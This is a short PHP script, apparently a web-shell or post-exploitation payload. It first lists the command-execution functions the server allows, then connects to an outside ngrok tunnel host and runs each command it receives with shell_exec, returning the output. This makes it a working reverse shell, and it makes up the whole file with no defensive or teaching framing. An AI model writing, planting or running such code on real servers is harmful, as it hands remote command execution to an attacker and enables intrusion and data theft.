<?php
// Check for dangerous PHP functions
$dangerous_functions = preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]);
if (!empty($dangerous_functions)) {
    print_r($dangerous_functions);  // Print out available dangerous functions
} else {
    echo "No dangerous functions found.\n";
}

// Reverse Shell Code
$ip = '0.tcp.in.ngrok.io';  // Use your ngrok public address (IP)
$port = 14289;              // Port from ngrok, here it’s 14289

// Create a socket to the remote server
$sock = fsockopen($ip, $port);
if (!$sock) {
    exit("Unable to connect to $ip on port $port\n");
}

// Duplicate input/output streams to the socket
while ($cmd = fgets($sock)) {
    $output = shell_exec($cmd);  // Execute the received command
    fwrite($sock, $output);      // Send back the command output
}

// Close the socket connection
fclose($sock);
?>
